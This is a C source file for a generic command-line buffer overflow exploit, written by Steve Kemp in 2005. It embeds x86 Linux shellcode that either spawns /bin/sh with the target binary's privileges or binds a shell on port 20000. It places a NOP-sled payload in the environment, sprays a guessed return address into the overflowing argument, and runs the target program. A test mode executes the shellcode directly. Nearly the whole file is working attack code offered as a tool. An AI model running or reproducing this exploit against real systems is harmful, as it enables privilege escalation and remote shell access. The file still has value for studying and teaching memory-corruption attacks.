/* -*-mode: C++; style: K&R; c-basic-offset: 4 ; -*- */

/*
 * cmd-overflow.c
 *  Generic exploit for command line buffer overflows.
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307 USA
 *
 *  Steve Kemp
 *  ---
 *  http://www.steve.org.uk/
 *
 */


#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <malloc.h>
#include <getopt.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>



/*
 * Version identifier from CVS.
 */
#define VERSION  "$Id: cmd-overflow.c,v 1.6 2005/10/15 14:51:36 steve Exp $"



/*
 * Definitions..
 */
#define DEFAULT_OFFSET                    0
#define DEFAULT_BUFFER_SIZE            1084
#define DEFAULT_EGG_SIZE               2048
#define NOP                            0x90



/*
 * Run /bin/sh with the priviledges of the binary.
 */
char shellcode_binsh[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

/*
 * Bind a shell on port 20000.
 */
char shellcode_portbind[] =
  "\x31\xdb\xf7\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b"
  "\xcd\x80\x89\xc7\x52\x66\x68\x4e\x20\x43\x66\x53\x89\xe1"
  "\xb0\xef\xf6\xd0\x50\x51\x57\x89\xe1\xb0\x66\xcd\x80\xb0"
  "\x66\x43\x43\xcd\x80\x50\x50\x57\x89\xe1\x43\xb0\x66\xcd"
  "\x80\x89\xd9\x89\xc3\xb0\x3f\x49\xcd\x80\x41\xe2\xf8\x51"
  "\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x51\x53"
  "\x89\xe1\xb0\xf4\xf6\xd0\xcd\x80";


/*
 * Options we accept.
 */
struct option options[] = {
    { "version",   no_argument,       NULL, 'v' },
    { "verbose",   no_argument,       NULL, 'V' },
    { "test",      no_argument,       NULL, 'T' },
    { "help",      no_argument,       NULL, 'h'},
    { "target",    required_argument, NULL, 't'},
    { "args",      required_argument, NULL, 'a'},
    { "size",      required_argument, NULL, 's'},
    { "payload",   required_argument, NULL, 'p'},
    {  0,          0,                 0,     0}
};


/*
 * Global variables.
 */
char *shellcode = shellcode_binsh;
int     verbose = 0;
int      test   = 0;


/*
 * Prototypes.
 */
int  doesBinaryExist( char *target );
void exploitBinary( char *target, char *args, int size );




/*
 * Find and return the version identifier from our CVS marker.
 */
char * getVersion( )
{
    char *start  = NULL;
    char *end    = NULL;
    char *memory = NULL;
    int length   = 0;


    start = strstr( VERSION, ",v " );
    if ( start == NULL )
	return NULL;

    /* Add on the ",v " text. */
    start += 3;
   
    /* Now find the next space - after the version marker */
    end = strstr( start, " " );
    if ( end == NULL )
	return NULL;


    /* Allocate, and zero, enough memory for the result. */
    length = end - start;
    memory = (char *)malloc( length + 1 );
    memset( memory, '\0', length+1);
	

    /* Copy in the version number. */
    strncpy( memory, start, length );
	

    return( memory );
}


/*
 * Show usage information.
 */
void showUsage( int argc, char *argv[] )
{
    char *version = getVersion();

    if ( version == NULL ) 
	printf("%s v%s by Steve Kemp\n", argv[0], "unknown" );
    else
    {
	printf("%s v%s by Steve Kemp\n", argv[0], version );
	free( version );
    }

    printf("Usage   : %s options\n", argv[ 0 ] );
    printf("Options :\n\n" );
    printf("         --target file        Set the name of the target program.\n" );
    printf("         --size   num         Set the size of the buffer we use.\n" );
    printf("         --args 'args'        Set the argument string to use.\n" );
    printf("                              (%% is replaced by the exploit buffer.)\n" );
    printf("         --verbose            Show diagnostics\n" );
    printf("         --test               Execute the selected shellcode only.\n" );
    printf("         --payload shell|bind Choose the shellcode to run\n" );
}


void showVersion( int argc, char *argv[] )
{
    char *version = getVersion();

    if ( version == NULL ) 
	printf("%s v%s by Steve Kemp\n", argv[0], "unknown" );
    else
    {
	printf("%s v%s by Steve Kemp\n", argv[0], version );
	free( version );
    }
}



/*
 * Entry point to the code.
 */
int main( int argc, char *argv[] )
{
    int opt_index = 0;
    int retval    = 0;
    char *target  = NULL;
    char *args    = "%";
    int size      = 2000;


    retval = getopt_long (argc, argv, "hvVptTas", options, &opt_index);
    while (retval != EOF)
    {
	switch (retval)
	{
	case '?': /* FALL through. */
	case 'h': /* show usage */
	    printf("\n");
	    showUsage(argc, argv);
	    exit (0);
	    break;
	case 'v':
	    showVersion(argc, argv);
	    exit( 0 );
	    break;
	case 'V':
	    verbose++;
	    break;
	case 'T':
	    test++;
	    break;
	case 't':
	    target = optarg;
	    break;
	case 's':
	    size = atoi(optarg);
	    break;
	case 'a':
	    args = optarg;
	    break;
	case 'p':
	    if ( strcmp( optarg, "shell" ) == 0 )
	    {
		shellcode = shellcode_binsh;

		if ( verbose )
		    printf("Using default shellcode\n");

	    }
	    else if ( strcmp( optarg, "bind" ) == 0 )
	    {
		shellcode = shellcode_portbind;
		
		if ( verbose )
		    printf("Using portbinding shellcode.\nConnect to port 20000 once the exploit has executed.\n");
	    }
	    else
	    {
		printf("Unrecognised payload option '%s'\n", optarg );
		exit(0);
	    }
	    break;
	}
	retval = getopt_long (argc, argv, "hVpvTtas", options, &opt_index);
    }


    if ( test )
    {
	if ( verbose )
	    printf( "Testing shellcode only:\n" );
	void (*a)() = (void *)shellcode; 
	a();
	exit(1);
    }


    /*
     * Make sure we get the arguments we expect.
     */
    if ( target == NULL )
    {
	if ( doesBinaryExist( "./a.out" ) )
	{
	    target = "./a.out";
	}
	else
	{
	    showUsage(argc, argv );
	    exit( 0 );
	}
    }

    if ( args == NULL )
    {
	printf("No argument format.\n");
	showUsage(argc, argv );
	exit(0);
    }

    if ( strchr( args, '%' ) == NULL )
    {
	printf("The argument string you specified didn't contain the '%%' marker.\n" );
	showUsage(argc, argv );
	exit( 0 );
    }


    /*
     * Test the target exists.
     */
    if ( ! doesBinaryExist( target ) )
    {
	printf("Target file '%s' doesn't exist.\n", target );
	exit( 0 );
    }


    /*
     *  Tracing 
     */
    if ( verbose )
    {
	printf("Exploiting : %s\n", target );
	printf("Buffer size: %d\n", size );
	printf("Arguments  : %s\n", args );
    }

    exploitBinary( target, args, size );

    exit(1 );
}




/*
 * Return 1 if the given binary exists.
 */
int doesBinaryExist( char *target )
{
    struct stat st;
    if ( stat( target, &st ) )
        return( 0 );
    else
	return( 1 );
}



/*
 * Exploit the given binary using the size and argument string
 * given.
 */
void exploitBinary( char *target, char *args, int size )
{
    char *buff, *ptr, *egg;
    long *addr_ptr, addr;
    int offset=DEFAULT_OFFSET;
    int i, eggsize=DEFAULT_EGG_SIZE;

    /* A way to get the ESP without using assembly instructions */
    int get_esp = (int)&get_esp;

    if (!(buff = malloc(size))) 
    {
	printf("Can't allocate memory.\n");
	exit(0);
    }

    if (!(egg = malloc(eggsize))) 
    {
	printf("Can't allocate memory.\n");
	exit(0);
    }

    addr = get_esp - offset;

    ptr = buff;
    addr_ptr = (long *) ptr;
    for (i = 0; i < size; i+=4)
	*(addr_ptr++) = addr;

    ptr = egg;
    for (i = 0; i < eggsize - strlen(shellcode) - 1; i++)
	*(ptr++) = NOP;

    for (i = 0; i < strlen(shellcode); i++)
	*(ptr++) = shellcode[i];
    
    buff[size - 1] = '\0';
    egg[eggsize - 1] = '\0';
    
    memcpy(egg,"EGG=",4);
    putenv(egg);
    memcpy(buff,"RET=",4);
    buff[3]='x';
    putenv(buff);

  
    {
	int len = strlen( target ) + strlen( args ) + strlen( buff ) + 4;
	int i   = 0;
    
	char *cmd = (char *)malloc( len );
	char *run = (char *)malloc( len );
	if ( ( cmd == NULL ) || ( run == NULL ) )
	{
	    printf("Can't allocate %d bytes for command line.\n", len );
	    return;
	}

	memset(cmd, '\0', len );
	memset(run, '\0', len );
	sprintf(cmd, "%s %s", target, args );
	
	/* replace % with buff now. */
	while( i < len )
	{
	    if ( cmd[i] == '%' ) 
	    {
		strcat( run,buff );
	    }
	    else
	    {
		char b[2];
		b[0]=cmd[i];
		b[1]='\0';
		strcat( run, b );
	    }
	    i ++;
	}
	if ( verbose )
	{
	    printf("Running: '%s'\n",run);
	}
	system( run );
    }
}
